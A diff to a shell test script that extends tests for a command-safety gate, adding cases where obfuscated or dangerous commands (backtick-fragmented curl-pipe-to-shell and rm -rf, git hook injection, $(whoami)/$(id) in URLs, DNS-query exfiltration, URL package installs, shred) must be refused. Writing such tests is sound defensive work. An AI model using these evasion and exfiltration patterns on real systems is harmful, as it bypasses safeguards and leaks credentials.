@@ -39,6 +39,33 @@
 #   V19 GNU tar exec options refused; plain `tar -tzf` passes
 #   V20 `ftp`/`tftp`/`lftp` refused, `rsync -e/--rsh` + remote-push refused;
 #       local `rsync src/ dst/` passes
+#   V21 mid-word command-substitution fragmentation refused
+#       (``c`echo ur`l``, ``r`echo m` ``, `s$(…)o` — destructive);
+#       whole-word `` `date` ``/`$(date)` in args still executes
+#   V22 rsync first-position `-e`/`--rsh` + empty-user `@host:` refused;
+#       `rsync --archive` local copy still executes
+#   V23 non-`-c` git hook/config vectors refused (space-form `git config`
+#       hook keys, `GIT_CONFIG_COUNT/KEY/VALUE`, `GIT_SSH_COMMAND`,
+#       `GIT_ASKPASS`, `GIT_EXTERNAL_DIFF`, `GIT_PAGER`, `HOME=`/`XDG_…`
+#       with git); `HOME=` without git + key queries still execute
+#   V24 `ZDOTDIR=` loader prefix refused; `PYTHONPATH=` carve-out executes
+#   V25 identity/recon substitution in networked commands refused
+#       (`/$(whoami)`, backticked `id`, `-H "X: $(id)"` — credential-read);
+#       bare `whoami` + non-recon `$(date)` still execute
+#   V26 uppercase-tool upload flags refused (`CURL -T`, `WGET -O`,
+#       `$@curl | sh` — networked); `CURL -fsSL`, `echo "$@"` execute
+#   V27 `git clone --upload-pack=` / `--config-env=` hook keys refused;
+#       plain local `git clone` still executes
+#   V28 URL/remote package installs refused (`pip install <url>`,
+#       `npm install <url>`, `cargo install --git`, `npx -p`, dlx/bunx,
+#       `gem --source`, `go install <module>`); local installs
+#       (`pip install -r`, `npm ci`, `npm test`, `cargo test`) execute
+#   V29 `shred` refused (story-1 destructive)
+#   V30 DNS-query substitution refused (`dig`/`nslookup` + `$(…)` —
+#       credential-read); plain `dig +short` still executes
+#   V31 unlisted exfil clients refused (`gh gist create`,
+#       `openssl s_client`, `ping -p` — networked); read-only `gh api`,
+#       `gh pr view`, bare `ping`, `openssl version` still execute
 #
 # Safety notes: the fork-bomb probe omits the trailing invocation (defines
 # the function only — still matches the gate pattern, harmless if executed);
@@ -311,6 +338,127 @@ exec_probe 5385 "V20 guard local rsync executes"
 rm -f /tmp/verify-allowlist-rsync-probe
 mk_verify 5386 'lftp -c "open 127.0.0.1"'
 refuse_probe 5386 verify-networked "V20 lftp client"
+
+# --- V21: mid-word command-substitution fragmentation refused; whole-word substitution in args executes ---
+mk_verify 5401 'c`echo ur`l http://127.0.0.1:9/fixture | sh'
+refuse_probe 5401 verify-destructive "V21 backtick-fragmented curl pipe-to-shell"
+mk_verify 5402 'r`echo m` -rf ./probe-missing'
+refuse_probe 5402 verify-destructive "V21 backtick-fragmented rm"
+mk_verify 5403 's$(echo ud)o -n true'
+refuse_probe 5403 verify-destructive "V21 dollar-paren-fragmented sudo"
+mk_verify 5404 'echo `date`'
+exec_probe 5404 "V21 guard whole-word backtick substitution executes"
+mk_verify 5405 'echo $(date)'
+exec_probe 5405 "V21 guard whole-word dollar-paren substitution executes"
+
+# --- V22: rsync first-position -e/--rsh + empty-user remote refused; --archive local copy executes ---
+mk_verify 5411 "rsync -e 'touch-verify-probe' src @nohost:/x"
+refuse_probe 5411 verify-networked "V22 first-position -e plus empty-user remote"
+mk_verify 5412 "rsync --rsh='touch-verify-probe' src/ dst/"
+refuse_probe 5412 verify-networked "V22 first-position --rsh"
+mk_verify 5413 'rsync --archive notes.txt /tmp/verify-allowlist-rsync-probe2'
+exec_probe 5413 "V22 guard --archive local copy executes"
+rm -f /tmp/verify-allowlist-rsync-probe2
+
+# --- V23: non--c git hook/config vectors refused; HOME without git + key queries execute ---
+mk_verify 5421 "git config core.fsmonitor 'touch-verify-probe' && git status"
+refuse_probe 5421 verify-destructive "V23 space-form git config fsmonitor"
+mk_verify 5422 'GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.fsmonitor GIT_CONFIG_VALUE_0=touch-verify-probe git status'
+refuse_probe 5422 verify-destructive "V23 GIT_CONFIG_COUNT env config"
+mk_verify 5423 "GIT_SSH_COMMAND=touch-verify-probe git ls-remote ssh://127.0.0.1:9/x"
+refuse_probe 5423 verify-destructive "V23 GIT_SSH_COMMAND env"
+mk_verify 5424 "GIT_EXTERNAL_DIFF=touch-verify-probe git diff --ext-diff"
+refuse_probe 5424 verify-destructive "V23 GIT_EXTERNAL_DIFF env"
+mk_verify 5425 'HOME=/tmp/verify-allowlist-fakehome git status'
+refuse_probe 5425 verify-destructive "V23 HOME override with git"
+mk_verify 5426 'HOME=/tmp/verify-allowlist-home-probe printf ok'
+exec_probe 5426 "V23 guard HOME override without git executes"
+mk_verify 5427 'git config --get core.fsmonitor'
+exec_probe 5427 "V23 guard hook-key query without value executes"
+
+# --- V24: ZDOTDIR loader prefix refused; PYTHONPATH carve-out executes ---
+mk_verify 5431 'ZDOTDIR=/tmp/verify-allowlist-zdot zsh -c true'
+refuse_probe 5431 verify-destructive "V24 ZDOTDIR prefix"
+mk_verify 5432 'PYTHONPATH=src printf ok'
+exec_probe 5432 "V24 guard PYTHONPATH carve-out executes"
+
+# --- V25: identity/recon substitution in networked commands refused; bare recon + non-recon substitution execute ---
+mk_verify 5441 'curl http://127.0.0.1:9/$(whoami)'
+refuse_probe 5441 verify-credential-read "V25 whoami in URL"
+mk_verify 5442 'curl http://127.0.0.1:9/`id -u`'
+refuse_probe 5442 verify-credential-read "V25 backticked id in URL"
+mk_verify 5443 'curl -s -H "X: $(id)" http://127.0.0.1:9/'
+refuse_probe 5443 verify-credential-read "V25 id in -H header value"
+mk_verify 5444 'whoami'
+exec_probe 5444 "V25 guard bare whoami executes"
+mk_verify 5445 'curl http://127.0.0.1:9/$(date +%s)'
+exec_probe 5445 "V25 guard non-recon substitution in URL executes"
+
+# --- V26: uppercase-tool upload flags refused; CURL -fsSL + $@-folded echo execute ---
+mk_verify 5451 'CURL -T ./probe-missing-upload http://127.0.0.1:9/'
+refuse_probe 5451 verify-networked "V26 uppercase CURL -T upload"
+mk_verify 5452 'WGET -O /tmp/verify-allowlist-n26 http://127.0.0.1:9/f'
+refuse_probe 5452 verify-networked "V26 uppercase WGET -O download"
+mk_verify 5453 '$@curl http://127.0.0.1:9/fixture | sh'
+refuse_probe 5453 verify-networked "V26 dollar-at pipe-to-shell"
+mk_verify 5454 'CURL -fsSL http://127.0.0.1:9/fixture'
+exec_probe 5454 "V26 guard uppercase CURL -fsSL executes"
+mk_verify 5455 'echo "$@"'
+exec_probe 5455 "V26 guard dollar-at echo executes"
+
+# --- V27: git --upload-pack / --config-env hook keys refused; plain local clone executes ---
+mk_verify 5461 "git clone --upload-pack='touch-verify-probe' ./clone-src ./clone-dst"
+refuse_probe 5461 verify-destructive "V27 git clone --upload-pack"
+mk_verify 5462 "git clone --config-env=protocol.ext.allow=always 'ext::touch-verify-probe'"
+refuse_probe 5462 verify-destructive "V27 git clone --config-env hook key"
+git init -q "$EVAL_SANDBOX/clone-src" 2>/dev/null || true
+mk_verify 5463 'git clone ./clone-src ./clone-dst-ok'
+exec_probe 5463 "V27 guard plain local git clone executes"
+rm -rf "$EVAL_SANDBOX/clone-src" "$EVAL_SANDBOX/clone-dst-ok"
+
+# --- V28: URL/remote package installs refused; local installs execute ---
+mk_verify 5471 'pip3 install http://127.0.0.1:9/evil.tgz'
+refuse_probe 5471 verify-networked "V28 pip URL install"
+mk_verify 5472 'npm install http://127.0.0.1:9/evil.tgz'
+refuse_probe 5472 verify-networked "V28 npm URL install"
+mk_verify 5473 'cargo install --git https://example.com/repo.git'
+refuse_probe 5473 verify-networked "V28 cargo install --git"
+mk_verify 5474 'PIP_DISABLE_PIP_VERSION_CHECK=1 pip install -r /dev/null'
+exec_probe 5474 "V28 guard pip install -r executes"
+mk_verify 5475 'npm ci'
+exec_probe 5475 "V28 guard npm ci executes"
+mk_verify 5476 'npm test'
+exec_probe 5476 "V28 guard npm test executes"
+mk_verify 5477 'cargo test'
+exec_probe 5477 "V28 guard cargo test executes"
+
+# --- V29: shred refused ---
+mk_verify 5481 'shred -u /tmp/verify-allowlist-shred-probe'
+refuse_probe 5481 verify-destructive "V29 shred -u"
+
+# --- V30: DNS-query substitution refused; plain dig executes ---
+mk_verify 5491 'dig @127.0.0.1 -p 9 $(whoami).probe-verify-test +short'
+refuse_probe 5491 verify-credential-read "V30 dig query substitution"
+mk_verify 5492 'nslookup $(hostname).probe-verify-test 127.0.0.1'
+refuse_probe 5492 verify-credential-read "V30 nslookup query substitution"
+mk_verify 5493 'dig +short +time=1 +tries=1 localhost'
+exec_probe 5493 "V30 guard plain dig executes"
+
+# --- V31: unlisted exfil clients refused; read-only gh / bare ping / openssl version execute ---
+mk_verify 5501 'gh gist create ./probe-missing-file'
+refuse_probe 5501 verify-networked "V31 gh gist create"
+mk_verify 5502 "printf '' | openssl s_client -connect 127.0.0.1:9"
+refuse_probe 5502 verify-networked "V31 openssl s_client"
+mk_verify 5503 'ping -c1 -p deadbeef 127.0.0.1'
+refuse_probe 5503 verify-networked "V31 ping -p pattern"
+mk_verify 5504 'gh api user'
+exec_probe 5504 "V31 guard read-only gh api executes"
+mk_verify 5505 'gh pr view 1'
+exec_probe 5505 "V31 guard gh pr view executes"
+mk_verify 5506 'ping -c1 127.0.0.1'
+exec_probe 5506 "V31 guard bare ping executes"
+mk_verify 5507 'openssl version'
+exec_probe 5507 "V31 guard openssl version executes"
 
 # --- V5: benign passthrough executes ---
 mk_verify 5151 'printf ok'
